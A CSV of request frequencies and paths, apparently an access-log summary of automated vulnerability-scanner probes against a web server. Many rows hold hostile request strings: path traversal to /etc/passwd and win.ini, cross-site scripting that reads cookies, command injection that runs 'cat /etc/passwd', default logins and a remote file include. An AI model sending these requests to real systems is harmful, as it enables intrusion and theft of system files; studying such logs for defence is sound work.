Frequency,Resource
1,/cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
1,dcshop/orders/orders.txt
1,/local/httpd$map.conf
2,/cgi-bin/cgiwrap/~www
1,retrieve_password.pl
1,/webcart-lite/orders/import.txt
1,/vider.php3
1,flexform
1,/xps/
1,/?Open
1,/TvLBvkHh.genpopuplist
1,echo.bat
1,/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
1,/pmamy/index.php
1,/examples/session
1,///etc/hosts
1,/cgi-bin/compatible.cgi
1,/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
1,/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
8,/phpMyAdmin/scripts/setup.php
1,ans.pl?p=../../../../../usr/bin/id|&blah
1,/cgi-bin/title.cgi
1,/%3C/title%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/cgi-bin/bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,mail
1,/TvLBvkHh.sys
1,foxweb.dll
1,/index.asp%5C
2,/cgi-bin/horde/test.php
1,fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/TvLBvkHh.AP
1,/cgi-bin/perl.exe?-v
1,/nsn/..%5Cutil/attrib.bas
1,/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
1,/cgi-bin/query?mss=%2e%2e/config
1,/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/goform/CheckLogin?login=root&password=tslinux
1,lwgate.cgi
1,/cgi-bin/input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/index.shtml
1,/error/HTTP_NOT_FOUND.html.var
1,/TvLBvkHh.backup
1,"/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,"/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,/?OpenServer
1,/MIDICART/midicart.mdb
1,/phonecfg.cfg
1,/?sql_debug=1
2,wwwwais
1,/scripts/cpshost.dll
1,/TvLBvkHh.pl%7Cdir
1,/TvLBvkHh.10:100
3,//pma/scripts/setup.php
1,/TvLBvkHh.signature
1,/Mem/dynaform/FileExplorer.htm
1,/pmamy2/index.php
1,/nsn/..%5Cutil/rd.bas
1,mrtg.cgi?cfg=blah
1,test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/cfdocs/examples/cvbeans/beaninfo.cfm
1,/cgi-bin/test-cgi.exe?<script>alert(document.cookie)</script>
1,/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html
1,/vchat/msg.txt
1,/cfcache.map
1,wrap
2,cgiwrap/~web
1,/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,com5.pl
1,/us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:\boot.ini
1,/guestbook/pwd
1,/TvLBvkHh.ml
1,/bigconf.cgi
1,/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd
1,/index.pl
1,cgitest.exe
1,"/upload.php?type=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/wwwadmin.pl
1,/webcart-lite/config/import.txt
1,/cgi-bin/test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/cgi-bin/classified.cgi
1,/cgi-bin/common/listrec.pl
1,/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
1,/oc/Search/sqlqhit.asp
1,htmlscript?../../../../../../../../../../etc/passwd
1,/mambo/index.php?Itemid=7JxZx
1,/domlog.nsf
1,/chat/!nicks.txt
1,/atomicboard/index.php?location=../../../../../../../../../../etc/passwd
1,/gxp2120/
1,/exchange/root.asp?acs=anon
1,"/administrator/gallery/uploadimage.php?directory=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/ezboard.cgi
1,/isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
1,/TvLBvkHh.dbm
1,info2www
1,/TvLBvkHh.dbc
1,"/administrator/gallery/view.php?path=\""<script>alert(document.cookie)</script>"
1,/IDSWebApp/IDSjsp/Login.jsp
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini
1,/exchange/lib/RENDER.INC
5,/phpMyAdmin/_scripts/setup.php
1,view-source
1,/phpmyadmin/index.php
1,/examples/servlets/index.html
1,"/vgn/login/1,501,,00.html?cookieName=x--\>"
1,/index.php3
2,/cgi-bin/cgiwrap/~ftp
1,/exchange/lib/JSATTACH.INC
1,/scripts/tools/dsnform
1,/forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script>
1,/TvLBvkHh.x-shop
1,/tvcs/getservers.exe?action=selects1
1,auth_data/auth_user_file.txt
1,"/msadm/site/index.php3?authid=\""><script>alert('Vulnerable')</script>"
1,cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.inc
1,common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
3,//phpmyadmin/scripts/setup.php
1,*
1,/asp/SQLQHit.asp
1,/TvLBvkHh.ini
1,/page.cgi?../../../../../../../../../../etc/passwd
1,"/cgi-bin/tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.pdf
1,/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
1,/scgi-bin/
5,/phpMyAdmin1/scripts/setup.php
1,webplus?about
1,/cgi-bin/anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,/inc/common.load.php
1,/cgi-bin/mail
1,/oc/Search/SQLQHit.asp
1,/cgi-bin/query
1,/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
2,cgiwrap/~www
1,/TvLBvkHh.pl
1,/TvLBvkHh.pm
1,mt-static/mt-load.cgi
1,zml.cgi?file=../../../../../../../../../../etc/passwd%00
5,/admin/scripts/setup.php
1,/cgi-bin/infosrch.cgi
1,/TvLBvkHh.zip
1,/TvLBvkHh.pw
1,"login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,sbcgi/sitebuilder.cgi
1,/TvLBvkHh.xml
1,/TvLBvkHh.00RelNotes
5,/mysql/scripts/setup.php
1,/modules.php?op=modload&name=Sections&file=index&req=viewarticle&artid=
1,/vgn/ac/index
1,dbman/db.cgi?db=no-db
1,/nsn/..%5Cutil/send.bas
1,/cgi-bin/perl
1,store/agora.cgi?page=whatever33.html
1,/TvLBvkHh.xtp
1,/servlets/SchedulerTransfer
1,/cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/a_security.htm
2,/index.aspx
1,/TvLBvkHh
1,/vgn/errors
1,/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/wp-includes/SimplePie/ogi.exe
1,/userinfo.php?uid=1;
2,/.well-known/security.txt
1,/examples/servlet/AUX
1,lastlines.cgi?process
1,/cgi-bin/DCShop/orders/orders.txt
1,/index.php?option=search&searchword=<script>alert(document.cookie);</script>
1,/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd
2,/admin/phpMyAdmin/index.php
1,ss
1,/scripts/samples/details.idc
1,/%3F.jsp
1,/TvLBvkHh.config
1,/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/guestbook.cgi
1,/cgi-bin/index.js0x70
1,"/phpBB/viewtopic.php?t=17071&highlight=\"">\""<script>javascript:alert(document.cookie)</script>"
1,/_mem_bin/remind.asp
1,/provisioning/spa/
5,/dbadmin/scripts/setup.php
1,/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,/chassis/config/GeneralChassisConfig.html
2,horde/test.php
5,MsmMask.exe?mask=/junk334
2,/cgi-bin/cgiwrap/~adm
1,/TvLBvkHh.bak
1,/TvLBvkHh.bat
1,/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00
1,webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.bas
1,/cgi-bin/db4web_c/dbdirname//etc/passwd
1,/TvLBvkHh.gif
1,/TvLBvkHh.UploadServlet
1,/adm/config.php
1,/help/
1,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
1,/TvLBvkHh.tml
1,/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/guestbook/guestbookdat
1,/vgn/performance/TMT/Report/XML
1,bannereditor.cgi
1,/cgi-bin/mkplog.exe
1,/phpMyAdmin/phpMyAdmin/index.php
1,"athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,ws_ftp.ini
1,"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>"
1,"alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.tmp
1,/shopping300.mdb
1,store/index.cgi?page=../../../../../../../../etc/passwd
1,/cgi-bin/viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cbms/realinv.php
1,/cgi-bin/probecontrol.cgi?command=enable&username=cancer&password=killer
1,/TvLBvkHh.var
1,title.cgi
1,/TvLBvkHh.bas:ShowVolume
1,/index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,/webcart/config/clients.txt
1,/search/htx/sqlqhit.asp
1,/spa/
1,finger.pl
1,htgrep?file=index.html&hdr=/etc/passwd
1,/typo3conf/
1,viralator.cgi
1,/cgi-bin/finger.pl
1,/cgi-bin/guestbook.pl
1,mrtg.cgi?cfg=../../../../../../../../etc/passwd
1,/TvLBvkHh.exe%7Cdir
1,mt/mt.cfg
1,/tftp/
1,/vgn/jsp/jspstatus56
1,opendir.php?/etc/passwd
1,/TvLBvkHh.listprint
1,"/modules/Forums/bb_smilies.php?bgcolor1=\""><script>alert('Vulnerable')</script>"
1,/cgi-bin/echo.bat?&dir+c:\\
1,/TvLBvkHh.iso-ru
1,/hidden.nsf
1,/trace.axd
1,/shopdbtest.asp
1,/cfide/Administrator/startstop.html
1,/billing/billing.apw
1,/TvLBvkHh.cmd
1,smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini
1,/mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb
1,visadmin.exe
1,badmin.cgi
1,/cgi-bin/visadmin.exe
1,viewsource?/etc/passwd
1,/COM
2,/LOGIN.PWD
1,/view_source.jsp
9,/phpmyadmin/scripts/setup.php
1,/nsn/fdir.bas:ShowVolume
1,/cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/vgn/performance/TMT/reset
1,search.pl?form=../../../../../../../../../../etc/passwd%00
3,/w00tw00t.at.blackhats.romanian.anti-sec:)
1,/cgi-915/
1,/add_user.php
1,/cgi-bin/test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/nsn/fdir.bas
1,/TvLBvkHh.org
1,/phpmyadmin0/index.php
1,/cgi-bin/multihtml.pl?multi=/etc/passwd%00html
1,/cgi-bin/auth_data/auth_user_file.txt
1,/TvLBvkHh.csc
1,listrec.pl
1,.access
1,"/cgi-bin/login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,/cgi-bin/nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/phoneprov.conf/
1,"/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>"
1,/vgn/asp/status
1,/TvLBvkHh.PRINT
1,/TvLBvkHh.csp
1,blog/mt.cfg
1,/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd
1,/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P
1,/servlet/SchedulerTransfer
1,/cgi-bin/empower?DB=whateverwhatever
1,/asp/sqlqhit.asp
1,/cgi-bin/SGB_DIR/superguestconfig
1,/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini
1,astrocam.cgi
1,/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
1,/samples/search.dll?query=<script>alert(document.cookie)</script>
1,/cgi-bin/test-env
1,/cgi-bin/bizdb1-search.cgi
1,/guestbook/guestbook.html
1,/VoIP_SIP.html
1,/nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&linecnt=500&refresh=0
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtm
1,/html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,calendar
1,/TvLBvkHh.TPF
1,/cgi-bin/faxsurvey?cat%20/etc/passwd
2,/cgi-bin/cgiwrap/~mysql
1,/ssi/envout.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\
7,/pma/scripts/setup.php
1,/%00
1,/wp-includes/
1,"/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\""><script>alert('Vulnerable')</script>"
1,"/downloads/pafiledb.php?action=download&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/cgi-local/cgiemail-1.6/cgicso?query=AAA
1,wwwadmin.pl
3,//phpMyAdmin/scripts/setup.php
1,sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>
1,/cartcart.cgi
1,/nsn/..%5Cutil/del.bas
1,/cab/top.shtml
1,/.perf
1,mkilog.exe
1,/cgi-bin/viewsource?/etc/passwd
1,/TvLBvkHh.class
1,/junk999.asp
1,/vgn/legacy/save
1,/cgi-bin/gm-cplog.cgi
1,/cgi-bin/
1,/contents.php?new_language=elvish&mode=select
1,/cgi-bin/webmap.cgi
1,/TvLBvkHh.Htm
1,/pt/
1,"/nice%20ports,/Trinity.txt.bak"
1,/TvLBvkHh.EXE
1,websendmail
2,cgiwrap/~sshd
1,/html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
1,/%3C/a%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,/index.html~
1,com5.java
1,/vgn/vr/Saving
1,stats/statsbrowse.asp?filepath=c:\&Opt=3
1,af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,"/administrator/popups/sectionswindow.php?type=web&link=\""<script>alert(document.cookie)</script>"
1,/scripts/iisadmin/bdir.htr
1,/TvLBvkHh.html+
1,/cgi-bin/htsearch?-c/nonexistant
1,/athenareg.php?pass=%20;cat%20/etc/passwd
1,/linksys/
1,/index.php?dir=<script>alert('Vulnerable')</script>
2,/cgi-bin/cgiwrap/~nobody4
1,loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
1,csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,cart32.exe
1,/TvLBvkHh.asp+
1,/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.asp
1,/CFIDE/probe.cfm
1,mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/index.php?download=/winnt/win.ini
1,"/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\""><script>alert('Vulnerable')</script>"
1,/vgn/performance/TMT/Report
1,/wikihome/action/conflict.php?TemplateDir=http://cirt.net/rfiinc.txt?
1,/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
1,/servlet/com.unify.servletexec.UploadServlet
1,/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>
1,/tftpboot/
1,/TvLBvkHh.BBoardServlet
1,/ca/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C/%5C%5Cetc/%5C%5Cpasswd
1,mailnews.cgi
1,/cgi-bin/update.dpgs
1,/horde/test.php
1,shop/auth_data/auth_user_file.txt
1,/cgi-bin/cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00
1,/cgi-bin/post32.exe%7Cdir%20c:%5C%5C
1,/TvLBvkHh.xml+
1,/pap2t/
1,/log.nsf
1,/scripts/samples/search/simple.idq
1,/TvLBvkHh.aspx
1,DCShop/auth_data/auth_user_file.txt
1,emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.shtml
1,/TvLBvkHh.html~
1,/TvLBvkHh.prf
1,/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
2,/admin/pma/index.php
1,emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/webtop/wdk/
1,/guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E
1,/cgi-bin/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/vgn/jsp/controller
1,/TvLBvkHh.nn
1,/TvLBvkHh.no
1,/TvLBvkHh.nl
1,/.TvLBvkHh
1,/exchange/lib/LANG.INC
1,/cgi-bin/handler
1,/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
1,/servlet/org.apache.catalina.servlets.WebdavStatus/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/get32.exe
1,/index.html%20
1,"/search.php?searchfor=\""><script>alert(1776)</script>"
1,/ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C
1,/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
1,/cgi-bin/php.cgi?/etc/passwd
1,/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp
1,/scripts/samples/search/author.idq
1,/cgi-bin/addbanner.cgi
1,/nsn/..%5Cutil/ren.bas
1,/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>
1,/inc/config.php
1,/cgi-bin/finger
1,/admin.cgi
1,/vgn/jsp/initialize
1,/webtop/wdk/samples/index.jsp
1,/fpdb/shop.mdb
1,uptime
1,/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,.cobalt
1,/TvLBvkHh.idq
1,/cgi-bin/webplus?about
1,/scripts/Carello/Carello.dll
1,/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,/mpcgi/
1,/webamil/test.php?mode=phpinfo
1,/TvLBvkHh.ida
1,/TvLBvkHh.idc
1,directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
1,/siteminder/smadmin.html
2,/imp/horde/test.php
1,/TvLBvkHh.htm
1,/%5BSecCheck%5D/..%252f..%252f../ext.ini
1,/admin.html
1,/cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,/exchange/lib/ATTACH.INC
1,/cfdocs/snippets/fileexists.cfm
1,/vgn/ac/delete
1,/cgi-bin/formmail.cgi
1,/TvLBvkHh.js0x70
1,/categorie.php3?cid=june
2,cgiwrap/~uucp
1,/cgi-bin/gm.cgi
1,/TvLBvkHh.htw
1,/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
1,/TvLBvkHh.htr
2,//
1,/cgi-bin/store/agora.cgi?page=whatever33.html
1,"/shop/normal_html.cgi?file=&lt;script&gt;alert(\""Vulnerable\"")&lt;/script&gt;"
1,/vgn/asp/style
1,/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/TvLBvkHh.ncf
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>
1,/cgi-bin/webgais
1,gH.cgi
1,/cgi-bin/snorkerz.bat
1,/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>
1,/ca//%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5Cwindows/%5C%5Cwin.ini
1,/cgi-bin/mailit.pl
1,/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif
1,/cgi-bin/perl.exe
2,/sitemap.xml
1,AT-admin.cgi
1,/cgi-bin/Pbcgi.exe
1,/TvLBvkHh.map
1,/friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>
1,/cgi-bin/probecontrol.cgi?command=enable&userNikto=cancer&password=killer
1,/cbms/passgen.php
1,/cgi-bin/.cobalt/message/message.cgi?info=%3Cscript%3Ealert%28%27alert%27%29%3B%3C/script%3E
43,/favicon.ico
1,/TvLBvkHh.htaccess~
1,/clusterframe.jsp
1,/cbms/changepass.php
2,/myadmin/index.php
1,/nsn/..%5Cweb/env.bas
1,/cgi-bin/ezadmin.cgi
1,/siteseed/
1,/bin/
1,"/servlet/custMsg?guestName=<script>alert(\""Vulnerable\"")</script>"
1,/cgi-bin/formmail
1,/oem_webstage/cgi-bin/oemapp_cgi
1,"/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/forums//administrator/config.php
1,/cgi-bin/auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
1,/.nsf/../winnt/win.ini
1,/TvLBvkHh.cobalt
1,/cgi-bin/mmstdod.cgi
1,/tcb/files/auth/r/root
1,/cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-914/
1,/cgi-bin/flexform.cgi
2,/cgi-bin/cgiwrap/~test
1,auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
1,/cgi-bin/myguestbook.cgi?action=view
1,/cgi-bin/.access
1,search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
1,/cgi-bin/.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>
1,/vgn/performance/TMT
1,/global.inc
1,/TvLBvkHh.bin
1,fortune
1,/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
1,/pma2012/
1,banner.cgi
1,/cgi-bin/lastlines.cgi?process
1,/cgi-bin/mt-static/mt.cfg
1,/cgi-bin/architext_query.cgi
1,/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5Cboot.ini
1,foxweb.exe
1,/cgi-bin/wrap.cgi
1,/TvLBvkHh.eml
1,way-board.cgi?db=/etc/passwd%00
1,/?mod=node&nid=some_thing&op=view
1,/cgi-bin/cmd1.exe?/c+dir
1,processit.pl
1,/TvLBvkHh.dpgs
2,/pmd/index.php
1,/cgi-bin/story.pl?next=../../../../../../../../../../etc/passwd%00
1,/.git/config
2,/cgi-bin/cgiwrap/~daemon
34,/style.css
1,/cgi-bin/store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html
1,/cgi-bin/cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
1,guestbook/passwd
1,/cgi-bin/cgicso?query=AAA
1,/pap2/
1,/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>
2,/cgi-bin/cgiwrap/~bin
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/vgn/ac/edit
1,mt/mt-load.cgi
1,awstats.pl
1,../abyss.conf
1,/TvLBvkHh.TXT
1,/cgi-bin/blog/
1,/modules.php?op=modload&name=0&file=0
1,/servlet/sunexamples.BBoardServlet
1,14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>
1,/cgi-bin/astrocam.cgi
1,/cgi-bin/mt/mt-load.cgi
1,/cgi-bin/FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
2,/phpadmin/index.php
1,calendar.pl
1,mmstdod.cgi
1,/snom300/
1,/webmail/blank.html
1,echo.bat?&dir+c:\\
1,/admin/system_footer.php
1,/phones/
1,/currentsetting.htm
1,talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1
1,netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
1,/webcart/config/
1,addbanner.cgi
1,/chat/data/usr
1,/TvLBvkHh.adjunct
1,/cgi-bin/FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/cgi-bin/handler.cgi
2,cgiwrap/~smtp
3,//myadmin/scripts/setup.php
1,/scripts/root.exe?/c+dir+c:\+/OG
2,/modules.php?name=Downloads&d_op=viewdownload
1,/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22
1,/cgi-bin/perlshop.cgi
1,/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp
1,/cgi-bin/wais.pl
1,/TvLBvkHh.jsp
1,bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
1,/TvLBvkHh.link
1,/iissamples/issamples/fastq.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,architext_query.pl
1,/scripts/tools/ctss.idc
1,/TvLBvkHh.show_query_columns
1,/TvLBvkHh.jse
1,/TvLBvkHh.www_acl
1,/asterisk/phoneprov/
1,/TvLBvkHh.jsa
1,/phoneprov/
1,search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/junk999.asp%5C
1,/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22
1,/phprocketaddin/?page=../../../../../../../../../../boot.ini
1,/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\windows\win.ini
1,way-board/way-board.cgi?db=/etc/passwd%00
1,/scripts/no-such-file.pl
1,/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd
1,db4web_c/dbdirNikto//etc/passwd
1,/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>
1,/%0A%0A%3Cscript%3Ealert(%5C%22Vulnerable%5C%22)%3C/script%3E.jsp
2,/admin/mysql/index.php
1,/phpmyadmin1/index.php
1,csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/phpmyadmin-old/index.php
1,.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>
1,"/administrator/gallery/navigation.php?directory=\""<script>alert(document.cookie)</script>"
